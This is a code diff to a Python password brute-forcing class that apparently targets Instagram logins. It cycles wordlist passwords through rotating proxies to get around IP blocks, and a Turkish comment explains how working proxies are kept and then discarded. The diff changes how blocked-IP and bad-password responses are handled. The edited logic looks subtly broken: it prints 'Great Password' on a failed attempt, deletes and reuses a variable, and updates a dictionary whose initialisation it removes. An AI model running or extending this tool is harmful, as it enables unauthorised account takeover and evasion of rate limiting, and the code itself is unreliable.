@@ -48,6 +48,7 @@ class Bruter:
             try:
                 with requests.Session() as session:
                     password = q.get()
+                    dispose = "" # Parola deneme sırasında çalışan proxye denk gelirsem buna kaydedicem işlem yapıp ardından yok edicem
                     choice_proxy = choice(self.__getproxy)
                     # print(runnerBruteBanner(passw=password,ip=choice_proxy,
                     #                     words=len(list(self.__readerwordlist())),
@@ -66,7 +67,6 @@ class Bruter:
                             'from_reg':'false','_csrftoken':self.__csrfToken(),
                             'login_attempt_countn':'0'
                         }
-                    __proxies = {}
                     if not self.__proxy_type in self.__prxs:
                         __proxies = {
                             "http":f"http://{choice_proxy}",
@@ -90,10 +90,17 @@ class Bruter:
                             q.task_done()
 
                         elif k == "error_type":
-                            if v == "ip_block" or v == "bad_password":
+                            if v == "ip_block":
                                 print(f"{Console.BLUE}Blocked IP: {choice_proxy}{Console.DEFAULT}")
+                                del dispose
+                            elif v == "bad_password":
+                                dispose = choice_proxy
+                                print("Great Password %s" % choice_proxy)
+                                print("Password %s" % password)
+                                __proxies.update({"http":f"{self.__proxy_type}://{dispose}","https":f"{self.__proxy_type}://{dispose}"})
 
                         elif k == "message":
+                            # print(json_load)
                             if v == "challenge_required":
                                 self.__isAlive = False
                                 self.__passw = password
